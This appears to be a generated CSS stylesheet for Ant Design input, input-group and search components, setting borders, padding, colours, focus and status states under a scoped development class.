    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper .ant-input-suffix {
      margin: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper .ant-input-suffix>*:not(:last-child) {
      margin-inline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper .ant-input-suffix .ant-input-clear-icon {
      position: absolute;
      inset-inline-end: 8px;
      inset-block-start: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper .ant-input-suffix .ant-input-textarea-suffix {
      position: absolute;
      top: 0;
      inset-inline-end: 11px;
      bottom: 0;
      z-index: 1;
      display: inline-flex;
      align-items: center;
      margin: auto;
      pointer-events: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper {
      position: relative;
      display: inline-flex;
      width: 100%;
      min-width: 0;
      padding: 4px 11px;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      background-color: #ffffff;
      background-image: none;
      border-width: 1px;
      border-style: solid;
      border-color: #d9d9d9;
      border-radius: 6px;
      transition: all 0.2s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper::-moz-placeholder {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper::placeholder {
      color: rgba(0, 0, 0, 0.25);
      user-select: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper:placeholder-shown {
      text-overflow: ellipsis;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper:hover {
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-focused {
      border-color: #4096ff;
      box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper[disabled] {
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
      box-shadow: none;
      cursor: not-allowed;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-disabled:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper[disabled]:hover {
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-borderless,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-borderless:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-borderless:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-borderless-focused,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-borderless-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-borderless[disabled] {
      background-color: transparent;
      border: none;
      box-shadow: none;
    }

    textarea:where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper {
      max-width: 100%;
      height: auto;
      min-height: 32px;
      line-height: 1.5714285714285714;
      vertical-align: bottom;
      transition: all 0.3s, height 0s;
      resize: vertical;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-lg {
      padding: 7px 11px;
      font-size: 16px;
      line-height: 1.5;
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-sm {
      padding: 0px 7px;
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-textarea-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper:not(.ant-input-affix-wrapper-disabled):hover {
      border-color: #4096ff;
      z-index: 1;
    }

    .ant-input-search-with-button :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper:not(.ant-input-affix-wrapper-disabled):hover {
      z-index: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-focused,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper:focus {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-disabled .ant-input[disabled] {
      background: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper>input.ant-input {
      padding: 0;
      font-size: inherit;
      border: none;
      border-radius: 0;
      outline: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper>input.ant-input::-ms-reveal {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper>input.ant-input:focus {
      box-shadow: none !important;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper::before {
      display: inline-block;
      width: 0;
      visibility: hidden;
      content: "\a0";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-suffix {
      display: flex;
      flex: none;
      align-items: center;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-prefix>*:not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-suffix>*:not(:last-child) {
      margin-inline-end: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-show-count-suffix {
      color: rgba(0, 0, 0, 0.45);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-show-count-has-suffix {
      margin-inline-end: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-prefix {
      margin-inline-end: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-suffix {
      margin-inline-start: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-clear-icon {
      margin: 0;
      color: rgba(0, 0, 0, 0.25);
      font-size: 12px;
      vertical-align: -1px;
      cursor: pointer;
      transition: color 0.3s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-clear-icon:hover {
      color: rgba(0, 0, 0, 0.45);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-clear-icon:active {
      color: rgba(0, 0, 0, 0.88);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-clear-icon-hidden {
      visibility: hidden;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .ant-input-clear-icon-has-suffix {
      margin: 0 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .anticon.ant-input-password-icon {
      color: rgba(0, 0, 0, 0.45);
      cursor: pointer;
      transition: all 0.3s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper .anticon.ant-input-password-icon:hover {
      color: rgba(0, 0, 0, 0.88);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-error:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper {
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-error:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper:hover {
      border-color: #ffa39e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-error:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-error:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper-focused {
      border-color: #ff4d4f;
      box-shadow: 0 0 0 2px rgba(255, 38, 5, 0.06);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-error:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper .ant-input-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-error:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper .ant-input-suffix {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-warning:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper {
      border-color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-warning:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper:hover {
      border-color: #ffd666;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-warning:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-warning:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper-focused {
      border-color: #faad14;
      box-shadow: 0 0 0 2px rgba(255, 215, 5, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-warning:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper .ant-input-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-affix-wrapper-status-warning:not(.ant-input-affix-wrapper-disabled):not(.ant-input-affix-wrapper-borderless).ant-input-affix-wrapper .ant-input-suffix {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      position: relative;
      display: table;
      width: 100%;
      border-collapse: separate;
      border-spacing: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group[class*='col-'] {
      padding-inline-end: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group[class*='col-']:last-child {
      padding-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-lg .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-lg>.ant-input-group-addon {
      padding: 7px 11px;
      font-size: 16px;
      line-height: 1.5;
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-sm .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-sm>.ant-input-group-addon {
      padding: 0px 7px;
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-lg .ant-select-single .ant-select-selector {
      height: 40px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-sm .ant-select-single .ant-select-selector {
      height: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input {
      display: table-cell;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input:not(:first-child):not(:last-child) {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-wrap {
      display: table-cell;
      width: 1px;
      white-space: nowrap;
      vertical-align: middle;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:not(:first-child):not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-wrap:not(:first-child):not(:last-child) {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-wrap>* {
      display: block !important;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon {
      position: relative;
      padding: 0 11px;
      color: rgba(0, 0, 0, 0.88);
      font-weight: normal;
      font-size: 14px;
      text-align: center;
      background-color: rgba(0, 0, 0, 0.02);
      border: 1px solid #d9d9d9;
      border-radius: 6px;
      transition: all 0.3s;
      line-height: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon .ant-select {
      margin: -5px -11px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon .ant-select.ant-select-single:not(.ant-select-customize-input):not(.ant-pagination-size-changer) .ant-select-selector {
      background-color: inherit;
      border: 1px solid transparent;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon .ant-select-open .ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon .ant-select-focused .ant-select-selector {
      color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon .ant-cascader-picker {
      margin: -9px -11px;
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon .ant-cascader-picker .ant-cascader-input {
      text-align: start;
      border: 0;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:first-child {
      border-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:last-child {
      border-inline-start: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input {
      width: 100%;
      margin-bottom: 0;
      text-align: inherit;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input:focus {
      z-index: 1;
      border-inline-end-width: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input:hover {
      z-index: 1;
      border-inline-end-width: 1px;
    }

    .ant-input-search-with-button :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input:hover {
      z-index: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input:first-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:first-child {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input:first-child .ant-select .ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:first-child .ant-select .ant-select-selector {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input-affix-wrapper:not(:first-child) .ant-input {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input-affix-wrapper:not(:last-child) .ant-input {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input:last-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:last-child {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group>.ant-input:last-child .ant-select .ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-group-addon:last-child .ant-select .ant-select-selector {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-affix-wrapper:not(:last-child) {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    .ant-input-search :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-affix-wrapper:not(:last-child) {
      border-start-start-radius: 6px;
      border-end-start-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-affix-wrapper:not(:first-child),
    .ant-input-search :where(.css-dev-only-do-not-override-pr0fja).ant-input-group .ant-input-affix-wrapper:not(:first-child) {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact {
      display: block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact::before {
      display: table;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact::after {
      display: table;
      clear: both;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-addon:not(:first-child):not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrap:not(:first-child):not(:last-child),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input:not(:first-child):not(:last-child) {
      border-inline-end-width: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-addon:not(:first-child):not(:last-child):hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrap:not(:first-child):not(:last-child):hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input:not(:first-child):not(:last-child):hover {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-addon:not(:first-child):not(:last-child):focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrap:not(:first-child):not(:last-child):focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input:not(:first-child):not(:last-child):focus {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>* {
      display: inline-block;
      float: none;
      vertical-align: top;
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input-affix-wrapper,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input-number-affix-wrapper,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-picker-range {
      display: inline-flex;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>*:not(:last-child) {
      margin-inline-end: -1px;
      border-inline-end-width: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input {
      float: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select>.ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select-auto-complete .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-cascader-picker .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input-group-wrapper .ant-input {
      border-inline-end-width: 1px;
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select>.ant-select-selector:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select-auto-complete .ant-input:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-cascader-picker .ant-input:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input-group-wrapper .ant-input:hover {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select>.ant-select-selector:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select-auto-complete .ant-input:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-cascader-picker .ant-input:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-input-group-wrapper .ant-input:focus {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select-focused {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select>.ant-select-arrow {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>*:first-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select:first-child>.ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select-auto-complete:first-child .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-cascader-picker:first-child .ant-input {
      border-start-start-radius: 6px;
      border-end-start-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>*:last-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select:last-child>.ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-cascader-picker:last-child .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-cascader-picker-focused:last-child .ant-input {
      border-inline-end-width: 1px;
      border-start-end-radius: 6px;
      border-end-end-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact>.ant-select-auto-complete .ant-input {
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrapper+.ant-input-group-wrapper {
      margin-inline-start: -1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrapper+.ant-input-group-wrapper .ant-input-affix-wrapper {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrapper:not(:last-child).ant-input-search>.ant-input-group>.ant-input-group-addon>.ant-input-search-button {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group.ant-input-group-compact .ant-input-group-wrapper:not(:last-child).ant-input-search>.ant-input-group>.ant-input {
      border-start-start-radius: 6px;
      border-start-end-radius: 0;
      border-end-end-radius: 0;
      border-end-start-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper {
      display: inline-block;
      width: 100%;
      text-align: start;
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-lg .ant-input-group-addon {
      border-radius: 8px;
      font-size: 16px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-sm .ant-input-group-addon {
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-status-error .ant-input-group-addon {
      color: #ff4d4f;
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-status-warning .ant-input-group-addon {
      color: #faad14;
      border-color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-disabled .ant-input-group-addon {
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
      box-shadow: none;
      cursor: not-allowed;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper-disabled .ant-input-group-addon:hover {
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper:not(.ant-input-compact-first-item):not(.ant-input-compact-last-item).ant-input-compact-item .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper:not(.ant-input-compact-first-item):not(.ant-input-compact-last-item).ant-input-compact-item .ant-input-group-addon {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper:not(.ant-input-compact-last-item).ant-input-compact-first-item .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper:not(.ant-input-compact-last-item).ant-input-compact-first-item .ant-input-group-addon {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper:not(.ant-input-compact-first-item).ant-input-compact-last-item .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-group-wrapper:not(.ant-input-compact-first-item).ant-input-compact-last-item .ant-input-group-addon {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input:focus {
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input:hover+.ant-input-group-addon .ant-input-search-button:not(.ant-btn-primary),
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input:focus+.ant-input-group-addon .ant-input-search-button:not(.ant-btn-primary) {
      border-inline-start-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input-affix-wrapper {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input-lg {
      line-height: 1.4998;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search>.ant-input-group>.ant-input-group-addon:last-child {
      inset-inline-start: -1px;
      padding: 0;
      border: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button {
      padding-top: 0;
      padding-bottom: 0;
      border-start-start-radius: 0;
      border-start-end-radius: 6px;
      border-end-end-radius: 6px;
      border-end-start-radius: 0;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary) {
      color: rgba(0, 0, 0, 0.45);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary):hover {
      color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary):active {
      color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search>.ant-input-group>.ant-input-group-addon:last-child .ant-input-search-button:not(.ant-btn-primary).ant-btn-loading::before {
      inset-inline-start: 0;
      inset-inline-end: 0;
      inset-block-start: 0;
      inset-block-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input-search-button {
      height: 32px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input-search-button:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search .ant-input-search-button:focus {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search-large .ant-input-search-button {
      height: 40px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search-small .ant-input-search-button {
      height: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item:not(.ant-input-compact-last-item) .ant-input-group-addon .ant-input-search-button {
      margin-inline-end: -1px;
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item:not(.ant-input-compact-first-item) .ant-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item:not(.ant-input-compact-first-item) .ant-input-affix-wrapper {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input-group-addon .ant-input-search-button:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item .ant-input-affix-wrapper:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input-group-addon .ant-input-search-button:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item .ant-input-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input-group-addon .ant-input-search-button:active,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input:active,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item .ant-input-affix-wrapper:active {
      z-index: 2;
    }

